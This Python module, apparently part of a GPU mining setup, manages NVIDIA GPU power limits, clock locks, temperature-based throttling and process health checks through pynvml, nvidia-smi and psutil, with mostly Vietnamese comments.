# ✅ RESOURCE CONTROL: GPU-only resource management
# All CPU optimization and throttling logic removed
# resource_control.py

# mypy: ignore-errors
# pyright: reportGeneralTypeIssues=false, reportMissingImports=false


import os
import psutil
import time
import uuid
import glob
import random
import shutil
import logging
import traceback
import threading
import subprocess
import re
import glob
import pynvml
import hashlib
from typing import Dict, Any, List, Optional, Set, Union
from concurrent.futures import ThreadPoolExecutor
import signal
import json
from datetime import datetime, timedelta
from collections import defaultdict, deque
import resource
from pathlib import Path

# Factory function for DAG synchronizer import
def get_dag_synchronizer_factory():
    """
    Factory function to import DAG synchronizer with fallback
    Handles both package and standalone imports
    """
    try:
        # Try package import first
        from mining_environment.scripts.dag_synchronization import get_dag_synchronizer, DAGState
        return get_dag_synchronizer, DAGState
    except ImportError:
        try:
            # Try relative import
            from .dag_synchronization import get_dag_synchronizer, DAGState
            return get_dag_synchronizer, DAGState
        except ImportError:
            try:
                # Try direct import for standalone testing
                from dag_synchronization import get_dag_synchronizer, DAGState
                return get_dag_synchronizer, DAGState
            except ImportError:
                # DAG module not available
                return None, None

# Get DAG imports
get_dag_synchronizer, DAGState = get_dag_synchronizer_factory()

try:
    from .utils import StrategyType
    from .module_loggers import get_resource_control_logger
    from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
except ImportError:
    # Fallback to absolute imports for standalone testing
    from utils import StrategyType
    from module_loggers import get_resource_control_logger
    from error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
    try:
        from dag_synchronization import get_dag_synchronizer, DAGState
    except ImportError:
        # DAG synchronization is optional
        get_dag_synchronizer = None
        DAGState = None

# ✅ STANDARDIZED: Get unified logger instance
resource_logger = get_resource_control_logger()

# ✅ ERROR REPORTER: Get centralized error reporter instance
error_reporter = get_error_reporter()
# **All CPU-related imports removed** (đã xóa hoàn toàn import CPU – chỉ giữ GPU-only mining)
from threading import RLock


###############################################################################
#                           GPU RESOURCE MANAGER                              #
###############################################################################
class GPUResourceManager:
    """
    Quản lý GPU thông qua pynvml (đồng bộ).

    Attributes:
        logger (logging.Logger): Logger để ghi log.
        config (Dict[str, Any]): Cấu hình GPU Resource Manager.
        gpu_initialized (bool): Cờ đánh dấu NVML đã khởi tạo hay chưa.
        process_gpu_settings (Dict[int, Dict[int, Dict[str, Any]]]): Lưu PID -> GPU Index -> settings.
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        """
        Khởi tạo GPUResourceManager.

        :param config: Cấu hình GPU Resource Manager (dict).
        :param logger: Đối tượng Logger.
        """
        self.logger = logger
        self.config = config
        self.gpu_initialized = False
        self.process_gpu_settings: Dict[int, Dict[int, Dict[str, Any]]] = {}
        
        # **INTELLIGENCE LAYER: Temperature Model Parameters** (tham số mô hình nhiệt độ)
        self.temp_history: Dict[int, List[tuple]] = {}  # GPU index -> [(timestamp, temp)]
        self.power_history: Dict[int, List[tuple]] = {}  # GPU index -> [(timestamp, power)]
        
        # **Newton's Cooling Law Constants** (hằng số định luật làm lạnh Newton)
        self.cooling_coefficient = config.get('cooling_coefficient', 0.05)  # k value
        self.ambient_temp = config.get('ambient_temp', 25.0)  # Room temperature (°C)
        
        # **Heat Generation Parameters** (tham số sinh nhiệt)
        self.thermal_efficiency = config.get('thermal_efficiency', 0.85)  # η = 85%
        self.heat_capacity = config.get('heat_capacity', 200.0)  # J/°C
        
        # **Safety Thresholds** (ngưỡng an toàn)
        self.temp_safe = config.get('temp_safe', 65)  # Safe operating temp
        self.temp_warning = config.get('temp_warning', 72)  # Warning threshold
        self.temp_critical = config.get('temp_critical', 78)  # Critical threshold
        self.temp_emergency = config.get('temp_emergency', 82)  # Emergency shutdown

        # Tự động khởi tạo NVML
        self.initialize_nvml()

    def initialize_nvml(self) -> bool:
        """
        Khởi tạo pynvml (đồng bộ).

        :return: True nếu khởi tạo thành công, False nếu thất bại.
        """
        try:
            pynvml.nvmlInit()
            self.logger.info("✅ [pynvml] (thư viện quản lý NVIDIA – Python bindings) initialized (đã được khởi tạo)")
            self.gpu_initialized = True
            return True
        except pynvml.NVMLError as error:
            self.logger.error(f"❌ Error initializing [pynvml] (thư viện quản lý NVIDIA – Python bindings): {error}")
            self.gpu_initialized = False
            return False
        except Exception as e:
            # ✅ ERROR REPORTING: GPU initialization failure
            error_reporter.report_error(
                ErrorCode.RESOURCE_MANAGER_INIT_FAILED,
                f"Lỗi khi khởi tạo [pynvml] (thư viện quản lý NVIDIA – Python bindings): {e}",
                ErrorSeverity.HIGH,
                module='resource_control',
                function='GPUResourceManager._initialize_nvml',
                context_data={'component': 'pynvml', 'error': str(e)},
                exception=e
            )
            self.logger.error(f"❌ Error initializing [pynvml] (thư viện quản lý NVIDIA – Python bindings): {e}")
            self.gpu_initialized = False
            return False

    def is_nvml_initialized(self) -> bool:
        """
        Kiểm tra NVML đã được khởi tạo hay chưa.

        :return: True nếu NVML đã khởi tạo, False nếu chưa.
        """
        return self.gpu_initialized

    def get_gpu_count(self) -> int:
        """
        Lấy số lượng GPU (đồng bộ).

        :return: Số GPU (int).
        """
        if not self.gpu_initialized:
            return 0
        try:
            return pynvml.nvmlDeviceGetCount()
        except pynvml.NVMLError:
            return 0

    def get_handle(self, gpu_index: int):
        """
        Lấy handle của GPU theo chỉ số (đồng bộ).

        :param gpu_index: Chỉ số GPU.
        :return: Handle thiết bị GPU, hoặc None nếu lỗi.
        """
        if not self.gpu_initialized:
            self.logger.error("[GPUResourceManager] (trình quản lý tài nguyên GPU) chưa init (chưa khởi tạo). Không thể lấy [GPU handle] (tay cầm thiết bị GPU – định danh thiết bị).")
            return None
        try:
            handle = pynvml.nvmlDeviceGetHandleByIndex(gpu_index)
            self.logger.debug(f"Đã lấy handle cho GPU={gpu_index}")
            return handle
        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi khi lấy handle GPU={gpu_index}: {e}")
            return None

    def get_gpu_power_limit(self, gpu_index: int) -> Optional[int]:
        """
        Trả về power limit (W) của GPU (đồng bộ).

        :param gpu_index: Chỉ số GPU.
        :return: Power limit (int) hoặc None nếu lỗi.
        """
        if not self.gpu_initialized:
            self.logger.error("[GPUResourceManager] (trình quản lý tài nguyên GPU) chưa init (chưa khởi tạo). Không thể lấy [power limit] (giới hạn công suất).")
            return None
        try:
            handle = self.get_handle(gpu_index)
            if not handle:
                self.logger.error(f"Không thể lấy handle cho GPU={gpu_index}.")
                return None
            limit_mw = pynvml.nvmlDeviceGetPowerManagementLimit(handle)
            limit_w = int(limit_mw // 1000)  # convert mW -> W
            self.logger.debug(f"Power limit hiện tại GPU={gpu_index}: {limit_w}W")
            return limit_w
        except Exception as e:
            self.logger.error(f"Lỗi get_gpu_power_limit GPU={gpu_index}: {e}")
            return None

    def get_gpu_power_usage(self, gpu_index: int) -> Optional[float]:
        """
        **Get GPU Power Usage** (lấy mức tiêu thụ điện hiện tại của GPU – đơn vị Watt)
        
        Backward-compat alias để đáp ứng các callsite hiện có.
        - Ưu tiên NVML; nếu không đọc được, trả None để callsite xử lý fallback.
        
        :param gpu_index: Chỉ số GPU
        :return: Công suất hiện tại (W) hoặc None nếu không đọc được
        """
        try:
            if not self.gpu_initialized:
                return None
            handle = self.get_handle(gpu_index)
            if not handle:
                return None
            power_mw = pynvml.nvmlDeviceGetPowerUsage(handle)
            return float(power_mw) / 1000.0  # mW -> W
        except Exception as e:
            self.logger.debug(f"[GPUResourceManager] Cannot read power usage for GPU={gpu_index}: {e}")
            return None

    # Backward-compat alias (bí danh tương thích ngược)
    get_current_power_usage = get_gpu_power_usage

    def set_gpu_power_limit(self, pid: Optional[int], gpu_index: int, power_limit_w: int) -> bool:
        """
        Đặt power limit cho GPU (đồng bộ).

        :param pid: PID cần quản lý, có thể None nếu áp dụng chung.
        :param gpu_index: Chỉ số GPU.
        :param power_limit_w: Power limit cần đặt (W).
        :return: True nếu thành công, False nếu thất bại.
        """
        if not self.gpu_initialized:
            self.logger.error("[GPUResourceManager] (trình quản lý tài nguyên GPU) chưa init (chưa khởi tạo). Không thể set [power limit] (đặt giới hạn công suất).")
            return False
        try:
            handle = self.get_handle(gpu_index)
            if not handle or power_limit_w <= 0:
                return False

            # Lấy giới hạn power limit từ GPU
            try:
                min_limit_mw, max_limit_mw = pynvml.nvmlDeviceGetPowerManagementLimitConstraints(handle)
                min_limit_w = min_limit_mw // 1000
                max_limit_w = max_limit_mw // 1000
                
                # Validate và điều chỉnh power limit trong khoảng cho phép
                if power_limit_w < min_limit_w:
                    self.logger.warning(f"Power limit {power_limit_w}W dưới mức tối thiểu {min_limit_w}W, điều chỉnh lên {min_limit_w}W")
                    power_limit_w = min_limit_w
                elif power_limit_w > max_limit_w:
                    self.logger.warning(f"Power limit {power_limit_w}W vượt mức tối đa {max_limit_w}W, điều chỉnh xuống {max_limit_w}W")
                    power_limit_w = max_limit_w
            except pynvml.NVMLError as e:
                self.logger.warning(f"Không thể lấy power limit constraints, sử dụng giá trị mặc định: {e}")
                # Fallback cho Tesla T4
                max_limit_w = 70
                if power_limit_w > max_limit_w:
                    self.logger.warning(f"Power limit {power_limit_w}W có thể vượt giới hạn, điều chỉnh xuống {max_limit_w}W")
                    power_limit_w = max_limit_w

            # Lưu power limit cũ
            current_mw = pynvml.nvmlDeviceGetPowerManagementLimit(handle)
            current_w = current_mw // 1000
            if pid is not None:
                if pid not in self.process_gpu_settings:
                    self.process_gpu_settings[pid] = {}
                if gpu_index not in self.process_gpu_settings[pid]:
                    self.process_gpu_settings[pid][gpu_index] = {}
                # Chỉ lưu giá trị gốc nếu chưa có, tránh ghi đè khi step-wise
                if 'power_limit_w' not in self.process_gpu_settings[pid][gpu_index]:
                    self.process_gpu_settings[pid][gpu_index]['power_limit_w'] = current_w

            new_limit_mw = power_limit_w * 1000
            pynvml.nvmlDeviceSetPowerManagementLimit(handle, new_limit_mw)
            self.logger.debug(f"Set power limit={power_limit_w}W cho GPU={gpu_index}, PID={pid}.")
            return True
        except pynvml.NVMLError as error:
            self.logger.error(f"Lỗi NVML set power limit GPU={gpu_index}: {error}")
            return False
        except Exception as e:
            self.logger.error(f"Lỗi set power limit GPU={gpu_index}: {e}")
            return False

    def set_gpu_clocks(self, pid: Optional[int], gpu_index: int, sm_clock: int, mem_clock: int) -> bool:
        """
        Đặt xung nhịp GPU (đồng bộ) thông qua nvidia-smi commands.

        :param pid: PID cần quản lý, có thể None nếu áp dụng chung.
        :param gpu_index: Chỉ số GPU.
        :param sm_clock: Mức SM clock (MHz).
        :param mem_clock: Mức Memory clock (MHz).
        :return: True nếu thành công, False nếu thất bại.
        """
        if not self.gpu_initialized:
            self.logger.error("[GPUResourceManager] (trình quản lý tài nguyên GPU) chưa init (chưa khởi tạo). Không thể set [GPU clocks] (đặt xung nhịp GPU).")
            return False
        try:
            handle = self.get_handle(gpu_index)
            if not handle or sm_clock <= 0 or mem_clock <= 0:
                return False

            # Lấy SM/MEM clock hiện tại (NVML API chuẩn)
            current_sm_clock = pynvml.nvmlDeviceGetClockInfo(handle, pynvml.NVML_CLOCK_SM)
            current_mem_clock = pynvml.nvmlDeviceGetClockInfo(handle, pynvml.NVML_CLOCK_MEM)

            if pid is not None:
                if pid not in self.process_gpu_settings:
                    self.process_gpu_settings[pid] = {}
                if gpu_index not in self.process_gpu_settings[pid]:
                    self.process_gpu_settings[pid][gpu_index] = {}
                # Chỉ lưu giá trị gốc nếu chưa có
                if 'sm_clock_mhz' not in self.process_gpu_settings[pid][gpu_index]:
                    self.process_gpu_settings[pid][gpu_index]['sm_clock_mhz'] = current_sm_clock
                if 'mem_clock_mhz' not in self.process_gpu_settings[pid][gpu_index]:
                    self.process_gpu_settings[pid][gpu_index]['mem_clock_mhz'] = current_mem_clock

            # Capability detection (NVML-first) trước khi khóa clocks
            mem_lock_supported = True
            try:
                # Một số GPU (ví dụ T4) không hỗ trợ lock memory clocks
                # Kiểm tra nhẹ bằng cách đọc clock info; nếu lỗi đặc thù, coi như không hỗ trợ
                _ = pynvml.nvmlDeviceGetClockInfo(handle, pynvml.NVML_CLOCK_MEM)
            except Exception as cap_e:
                mem_lock_supported = False
                self.logger.info(f"ℹ️ [CAPABILITY] Memory clock lock unsupported on this GPU: {cap_e}. Skipping mem clock lock.")

            # Set SM clock
            cmd_sm = [
                'nvidia-smi',
                '-i', str(gpu_index),
                '--lock-gpu-clocks=' + str(sm_clock)
            ]
            subprocess.run(cmd_sm, check=True)
            self.logger.debug(f"Set SM clock={sm_clock}MHz cho GPU={gpu_index}, PID={pid}.")

            # Set MEM clock (nếu hỗ trợ)
            if mem_lock_supported:
                cmd_mem = [
                    'nvidia-smi',
                    '-i', str(gpu_index),
                    '--lock-memory-clocks=' + str(mem_clock)
                ]
                subprocess.run(cmd_mem, check=True)
                self.logger.debug(f"Set MEM clock={mem_clock}MHz cho GPU={gpu_index}, PID={pid}.")
            else:
                self.logger.info(f"ℹ️ [CAPABILITY] Skipped locking MEM clock for GPU={gpu_index} (unsupported).")

            return True
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Lỗi nvidia-smi set clocks GPU={gpu_index}: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Lỗi set clocks GPU={gpu_index}: {e}")
            return False

    def limit_temperature(self, pid: Optional[int], gpu_index: int, temperature_threshold: float, fan_speed_increase: float) -> bool:
        """
        Quản lý nhiệt độ GPU bằng cách điều chỉnh quạt, công suất, và xung nhịp.

        :param pid: PID gắn với tiến trình cần điều chỉnh (để tracking/restore theo PID). Có thể None nếu áp dụng GPU-wide.
        :param gpu_index: Chỉ số GPU cần điều chỉnh.
        :param temperature_threshold: Ngưỡng nhiệt độ (°C).
        :param fan_speed_increase: Tỷ lệ tăng tốc độ quạt (giả định).
        :return: True nếu thành công, False nếu thất bại.
        """
        try:
            if not self.gpu_initialized:
                self.logger.error("[GPUResourceManager] (trình quản lý tài nguyên GPU) chưa init (chưa khởi tạo). Không thể thực hiện limit_temperature (giới hạn nhiệt độ).")
                return False

            # Lấy nhiệt độ hiện tại
            current_temperature = self.get_gpu_temperature(gpu_index)
            if current_temperature is None:
                self.logger.warning(f"Không thể lấy nhiệt độ GPU={gpu_index}. Bỏ qua điều chỉnh.")
                return False

            # Tăng tốc độ quạt
            if self.control_fan_speed(gpu_index, fan_speed_increase):
                self.logger.info(f"Quạt GPU={gpu_index} tăng thêm {fan_speed_increase}%.")
            else:
                self.logger.warning(f"Không thể điều chỉnh quạt GPU={gpu_index}.")

            # Lấy các giá trị hiệu năng hiện tại
            handle = self.get_handle(gpu_index)
            if not handle:
                self.logger.error(f"Không thể lấy handle GPU={gpu_index}.")
                return False

            try:
                current_sm_clock = pynvml.nvmlDeviceGetClockInfo(handle, pynvml.NVML_CLOCK_SM)
            except Exception as ex:
                self.logger.error(f"Không thể lấy xung nhịp SM của GPU={gpu_index}: {ex}")
                return False

            current_power_limit = self.get_gpu_power_limit(gpu_index)
            if current_power_limit is None:
                self.logger.error(f"Không thể lấy power limit GPU={gpu_index}.")
                return False

            # Xử lý dựa trên nhiệt độ
            if current_temperature > temperature_threshold:
                # GPU quá nóng => Throttle
                self.logger.info(f"Nhiệt độ GPU={gpu_index}={current_temperature}°C vượt ngưỡng {temperature_threshold}°C. Giảm hiệu năng.")

                # Tính mức độ throttle
                excess_temp = current_temperature - temperature_threshold
                if excess_temp <= 5:
                    throttle_pct = 10
                elif excess_temp <= 10:
                    throttle_pct = 20
                else:
                    throttle_pct = 30
                self.logger.debug(f"excess_temp={excess_temp}°C => throttle_pct={throttle_pct}%")

                # Giảm công suất
                desired_power_limit = max(100, int(current_power_limit * (1 - throttle_pct / 100)))
                if self.set_gpu_power_limit(pid, gpu_index, desired_power_limit):
                    self.logger.info(f"Giảm power limit GPU={gpu_index} xuống {desired_power_limit}W (PID={pid}).")

                # Giảm xung nhịp SM
                new_sm_clock = max(500, current_sm_clock - 100)
                if self.set_gpu_clocks(pid, gpu_index, new_sm_clock, 877):  # mem_clock luôn là 877
                    self.logger.info(f"Giảm xung nhịp SM GPU={gpu_index}: SM={new_sm_clock}MHz, MEM=877MHz (PID={pid}).")

            elif current_temperature < temperature_threshold:
                # GPU mát => Boost
                self.logger.info(f"Nhiệt độ GPU={gpu_index}={current_temperature}°C dưới ngưỡng {temperature_threshold}°C. Tăng hiệu năng.")

                # Tính mức độ boost
                diff_temp = temperature_threshold - current_temperature
                if diff_temp <= 5:
                    boost_pct = 10
                elif diff_temp <= 10:
                    boost_pct = 20
                else:
                    boost_pct = 30
                self.logger.debug(f"diff_temp={diff_temp}°C => boost_pct={boost_pct}%")

                # Tăng công suất (nhưng không vượt quá giới hạn GPU)
                # Lấy giới hạn tối đa từ GPU
                try:
                    min_limit_mw, max_limit_mw = pynvml.nvmlDeviceGetPowerManagementLimitConstraints(handle)
                    max_limit_w = max_limit_mw // 1000
                except pynvml.NVMLError:
                    max_limit_w = 70  # Fallback cho Tesla T4
                
                desired_power_limit = min(max_limit_w, int(current_power_limit * (1 + boost_pct / 100)))
                if self.set_gpu_power_limit(pid, gpu_index, desired_power_limit):
                    self.logger.info(f"Tăng power limit GPU={gpu_index} lên {desired_power_limit}W (PID={pid}).")

                # Tăng xung nhịp SM
                new_sm_clock = min(1245, current_sm_clock + int(current_sm_clock * boost_pct / 100))
                if self.set_gpu_clocks(pid, gpu_index, new_sm_clock, 877):  # mem_clock luôn là 877
                    self.logger.info(f"Tăng xung nhịp SM GPU={gpu_index}: SM={new_sm_clock}MHz, MEM=877MHz (PID={pid}).")
            else:
                # Nhiệt độ trong khoảng an toàn
                self.logger.info(f"Nhiệt độ GPU={gpu_index}={current_temperature}°C trong ngưỡng an toàn. Không cần điều chỉnh.")

            return True
        except Exception as e:
            self.logger.error(f"Lỗi khi quản lý nhiệt độ GPU={gpu_index}: {e}")
            return False

    def get_gpu_temperature(self, gpu_index: int) -> Optional[float]:
        """
        Lấy nhiệt độ GPU (đồng bộ).

        :param gpu_index: Chỉ số GPU.
        :return: Nhiệt độ GPU (float) hoặc None nếu lỗi.
        """
        try:
            if not self.gpu_initialized:
                self.logger.error("[GPUResourceManager] (trình quản lý tài nguyên GPU) chưa init (chưa khởi tạo). Không thể lấy nhiệt độ GPU.")
                return None
            handle = self.get_handle(gpu_index)
            if not handle:
                self.logger.error(f"Không thể lấy handle cho GPU={gpu_index}.")
                return None
            temp = pynvml.nvmlDeviceGetTemperature(handle, pynvml.NVML_TEMPERATURE_GPU)
            self.logger.debug(f"Nhiệt độ GPU={gpu_index}: {temp}°C")
            return float(temp)
        except Exception as e:
            self.logger.error(f"Lỗi get_gpu_temperature GPU={gpu_index}: {e}")
            # Fallback using nvidia-smi
            try:
                cmd = f"nvidia-smi -i {gpu_index} -q -d TEMPERATURE | grep 'GPU Current Temp' | awk '{{print $5}}'"
                output = subprocess.check_output(cmd, shell=True).decode().strip()
                temp = float(output)
                self.logger.debug(f"Nhiệt độ GPU={gpu_index} từ fallback: {temp}°C")
                return temp
            except Exception as fallback_e:
                self.logger.error(f"Lỗi fallback get_gpu_temperature GPU={gpu_index}: {fallback_e}")
            return None

    def control_fan_speed(self, gpu_index: int, increase_percentage: float) -> bool:
        """
        Điều chỉnh quạt GPU bằng nvidia-settings (đồng bộ). Tuỳ driver hỗ trợ.

        :param gpu_index: Chỉ số GPU.
        :param increase_percentage: Mức tăng quạt (giả lập).
        :return: True nếu thành công, False nếu thất bại.
        """
        self.logger.info(f"[GPU Fan] control_fan_speed đã bị vô hiệu hóa.")
        return True

    def get_default_power_limit(self, gpu_index: int) -> int:
        """
        Lấy Power Limit mặc định của GPU.

        :param gpu_index: Chỉ số GPU.
        :return: Giá trị Power Limit mặc định (W), hoặc None nếu không lấy được.
        """
        try:
            handle = self.get_handle(gpu_index)
            return pynvml.nvmlDeviceGetPowerManagementDefaultLimit(handle) // 1000  # Chuyển từ mW sang W
        except Exception as e:
            self.logger.error(f"Lỗi khi lấy default power limit của GPU={gpu_index}: {e}")
            return None

    def predict_temperature_trajectory(self, gpu_index: int, power_watts: float, 
                                       time_horizon: float = 60.0) -> Dict[str, Any]:
        """
        **INTELLIGENCE LAYER: Predict temperature trajectory** (dự đoán quỹ đạo nhiệt độ)
        Using Newton's Cooling Law: dT/dt = -k(T - T_ambient) + Q/C
        
        :param gpu_index: GPU index to predict for
        :param power_watts: Power consumption in watts
        :param time_horizon: Time to predict ahead (seconds)
        :return: Prediction results with trajectory and safety status
        """
        try:
            # **Get current temperature** (lấy nhiệt độ hiện tại)
            handle = self.get_handle(gpu_index)
            if not handle:
                return {'error': 'Cannot get GPU handle'}
                
            current_temp = pynvml.nvmlDeviceGetTemperature(handle, pynvml.NVML_TEMPERATURE_GPU)
            
            # **Calculate heat generation rate** (tính tốc độ sinh nhiệt)
            # Q = P × η (Power × Thermal Efficiency)
            heat_generation = power_watts * self.thermal_efficiency
            
            # **Predict temperature over time** (dự đoán nhiệt độ theo thời gian)
            trajectory = []
            dt = 1.0  # Time step (seconds)
            temp = float(current_temp)
            
            for t in range(int(time_horizon)):
                # **Newton's Cooling Law** (định luật làm lạnh Newton)
                # dT/dt = -k(T - T_ambient) + Q/C
                cooling_rate = -self.cooling_coefficient * (temp - self.ambient_temp)
                heating_rate = heat_generation / self.heat_capacity
                
                # **Temperature change** (thay đổi nhiệt độ)
                dT = (cooling_rate + heating_rate) * dt
                temp += dT
                
                # **Record trajectory point** (ghi điểm quỹ đạo)
                trajectory.append({
                    'time': t,
                    'temperature': temp,
                    'cooling_rate': cooling_rate,
                    'heating_rate': heating_rate
                })
                
            # **Analyze trajectory for safety** (phân tích quỹ đạo về an toàn)
            max_temp = max(p['temperature'] for p in trajectory)
            steady_state_temp = trajectory[-1]['temperature']
            
            # **Determine safety status** (xác định trạng thái an toàn)
            safety_status = 'SAFE'
            if max_temp >= self.temp_emergency:
                safety_status = 'EMERGENCY'
            elif max_temp >= self.temp_critical:
                safety_status = 'CRITICAL'
            elif max_temp >= self.temp_warning:
                safety_status = 'WARNING'
                
            # **Calculate cooling efficiency** (tính hiệu suất làm mát)
            cooling_efficiency = self.calculate_cooling_efficiency(
                current_temp, steady_state_temp, power_watts
            )
            
            # **Store history** (lưu lịch sử)
            if gpu_index not in self.temp_history:
                self.temp_history[gpu_index] = []
            self.temp_history[gpu_index].append((time.time(), current_temp))
            
            # Keep only last 100 entries
            if len(self.temp_history[gpu_index]) > 100:
                self.temp_history[gpu_index] = self.temp_history[gpu_index][-100:]
                
            return {
                'current_temperature': current_temp,
                'predicted_max': max_temp,
                'steady_state': steady_state_temp,
                'safety_status': safety_status,
                'cooling_efficiency': cooling_efficiency,
                'trajectory': trajectory[:10],  # Return first 10 points
                'recommendations': self.get_temperature_recommendations(max_temp, power_watts)
            }
            
        except Exception as e:
            self.logger.error(f"Temperature prediction error for GPU {gpu_index}: {e}")
            return {'error': str(e)}
    
    def calculate_cooling_efficiency(self, current_temp: float, steady_temp: float, 
                                    power_watts: float) -> float:
        """
        **Calculate cooling system efficiency** (tính hiệu suất hệ thống làm mát)
        
        :param current_temp: Current GPU temperature
        :param steady_temp: Predicted steady-state temperature
        :param power_watts: Power consumption
        :return: Efficiency percentage (0-100)
        """
        try:
            # **Ideal cooling would maintain ambient temperature** (làm mát lý tưởng duy trì nhiệt độ môi trường)
            temp_rise = steady_temp - self.ambient_temp
            
            # **Efficiency based on temperature rise per watt** (hiệu suất dựa trên độ tăng nhiệt/watt)
            if power_watts > 0:
                temp_per_watt = temp_rise / power_watts
                # Good cooling: < 0.2°C/W, Poor: > 0.5°C/W
                if temp_per_watt < 0.2:
                    efficiency = 100.0
                elif temp_per_watt > 0.5:
                    efficiency = 20.0
                else:
                    # Linear interpolation
                    efficiency = 100.0 - ((temp_per_watt - 0.2) / 0.3) * 80.0
            else:
                efficiency = 100.0
                
            return max(0.0, min(100.0, efficiency))
            
        except Exception:
            return 50.0  # Default medium efficiency
            
    def get_temperature_recommendations(self, predicted_max: float, power_watts: float) -> List[str]:
        """
        **Generate optimization recommendations** (tạo khuyến nghị tối ưu)
        
        :param predicted_max: Predicted maximum temperature
        :param power_watts: Current power consumption
        :return: List of recommendations
        """
        recommendations = []
        
        if predicted_max >= self.temp_emergency:
            recommendations.append("⚠️ EMERGENCY: Reduce power immediately to prevent damage")
            recommendations.append(f"📉 Reduce power by {int((power_watts * 0.3))}W minimum")
            
        elif predicted_max >= self.temp_critical:
            recommendations.append("🔴 CRITICAL: Temperature approaching limits")
            recommendations.append(f"📉 Consider reducing power by {int((power_watts * 0.2))}W")
            recommendations.append("🌡️ Increase cooling or reduce workload")
            
        elif predicted_max >= self.temp_warning:
            recommendations.append("🟡 WARNING: Temperature elevated but manageable")
            recommendations.append(f"📊 Monitor closely, consider {int((power_watts * 0.1))}W reduction")
            
        else:
            recommendations.append("✅ SAFE: Temperature within normal range")
            if predicted_max < self.temp_safe - 10:
                available_headroom = self.temp_safe - predicted_max
                recommendations.append(f"📈 Can increase power by ~{int(available_headroom * 2)}W safely")
                
        return recommendations

    def validate_pid_health(self, pid: int) -> Dict[str, Any]:
        """
        Enhanced PID Health Monitoring - Kiểm tra sức khỏe toàn diện của tiến trình.
        
        Kiểm tra:
        - Process existence (sự tồn tại tiến trình)
        - Process status (trạng thái: running/zombie/stopped) 
        - Memory usage (sử dụng bộ nhớ RAM và VRAM)
        - CPU utilization (mức sử dụng CPU)
        - GPU affinity (GPU được sử dụng bởi PID)
        - I/O activity (hoạt động đọc/ghi)
        - Health score (điểm sức khỏe tổng hợp 0-100)
        
        :param pid: Process ID cần kiểm tra
        :return: Dict chứa các metrics về sức khỏe của tiến trình
        """
        health_metrics = {
            'pid': pid,
            'pid_exists': False,
            'process_status': 'unknown',
            'memory_usage_mb': 0,
            'cpu_percent': 0.0,
            'gpu_index': None,
            'gpu_memory_mb': 0,
            'io_counters': None,
            'health_score': 0,
            'timestamp': time.time(),
            'errors': []
        }
        
        try:
            # Step 1: Check process existence
            if not psutil.pid_exists(pid):
                health_metrics['errors'].append('Process does not exist')
                self.logger.warning(f"PID {pid} does not exist")
                return health_metrics
            
            health_metrics['pid_exists'] = True
            # Alias for backward compatibility to avoid downstream KeyError
            health_metrics['exists'] = health_metrics['pid_exists']
            
            # Step 2: Get process object and basic info
            try:
                process = psutil.Process(pid)
                
                # Process status (running/zombie/stopped/sleeping)
                health_metrics['process_status'] = process.status()
                
                # Memory usage (RAM)
                mem_info = process.memory_info()
                health_metrics['memory_usage_mb'] = mem_info.rss / (1024 * 1024)  # Convert to MB
                
                # CPU utilization (call twice with interval for accurate measurement)
                process.cpu_percent()  # First call to initialize
                time.sleep(0.1)  # Small delay for measurement
                health_metrics['cpu_percent'] = process.cpu_percent()
                
                # I/O counters (if available)
                try:
                    io_counters = process.io_counters()
                    health_metrics['io_counters'] = {
                        'read_count': io_counters.read_count,
                        'write_count': io_counters.write_count,
                        'read_bytes': io_counters.read_bytes,
                        'write_bytes': io_counters.write_bytes
                    }
                except (psutil.AccessDenied, AttributeError):
                    self.logger.debug(f"Cannot access I/O counters for PID {pid}")
                
            except psutil.NoSuchProcess:
                health_metrics['errors'].append('Process terminated during check')
                return health_metrics
            except psutil.AccessDenied:
                health_metrics['errors'].append('Access denied to process info')
                self.logger.warning(f"Access denied to PID {pid} info")
            
            # Step 3: Check GPU affinity and VRAM usage
            gpu_index = self.infer_gpu_index_for_pid(pid)
            if gpu_index is not None:
                health_metrics['gpu_index'] = gpu_index
                
                # Get GPU memory usage for this PID
                try:
                    handle = self.get_handle(gpu_index)
                    if handle:
                        # Try to get process GPU memory usage
                        try:
                            procs = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                            for proc in procs:
                                if proc.pid == pid:
                                    health_metrics['gpu_memory_mb'] = proc.usedGpuMemory / (1024 * 1024)
                                    break
                        except:
                            # Fallback to graphics processes
                            try:
                                procs = pynvml.nvmlDeviceGetGraphicsRunningProcesses(handle)
                                for proc in procs:
                                    if proc.pid == pid:
                                        health_metrics['gpu_memory_mb'] = proc.usedGpuMemory / (1024 * 1024)
                                        break
                            except:
                                pass
                except Exception as e:
                    self.logger.debug(f"Cannot get GPU memory for PID {pid}: {e}")
            
            # Step 4: Calculate health score (0-100)
            score = 100
            
            # Deduct points based on issues
            if health_metrics['process_status'] == 'zombie':
                score -= 50  # Zombie process is very unhealthy
            elif health_metrics['process_status'] == 'stopped':
                score -= 30  # Stopped process needs attention
            elif health_metrics['process_status'] == 'sleeping':
                score -= 5   # Sleeping is normal but not actively working
            
            # Memory usage check (deduct if using too much)
            if health_metrics['memory_usage_mb'] > 8192:  # > 8GB RAM
                score -= 20
            elif health_metrics['memory_usage_mb'] > 4096:  # > 4GB RAM
                score -= 10
            
            # CPU usage check
            if health_metrics['cpu_percent'] > 90:
                score -= 15  # Very high CPU usage
            elif health_metrics['cpu_percent'] < 1:
                score -= 10  # Too low, might be idle
            
            # GPU memory check
            if health_metrics['gpu_memory_mb'] > 8192:  # > 8GB VRAM
                score -= 15
            elif health_metrics['gpu_memory_mb'] < 100 and gpu_index is not None:
                score -= 10  # Has GPU but not using VRAM
            
            # Ensure score is in valid range
            health_metrics['health_score'] = max(0, min(100, score))
            
            # Log health check result
            self.logger.debug(
                f"PID {pid} health check: status={health_metrics['process_status']}, "
                f"RAM={health_metrics['memory_usage_mb']:.1f}MB, "
                f"CPU={health_metrics['cpu_percent']:.1f}%, "
                f"GPU={health_metrics['gpu_index']}, "
                f"VRAM={health_metrics['gpu_memory_mb']:.1f}MB, "
                f"score={health_metrics['health_score']}/100"
            )
            
        except Exception as e:
            health_metrics['errors'].append(f"Unexpected error: {str(e)}")
            self.logger.error(f"Error in validate_pid_health for PID {pid}: {e}")
            import traceback
            self.logger.debug(traceback.format_exc())
        
        return health_metrics

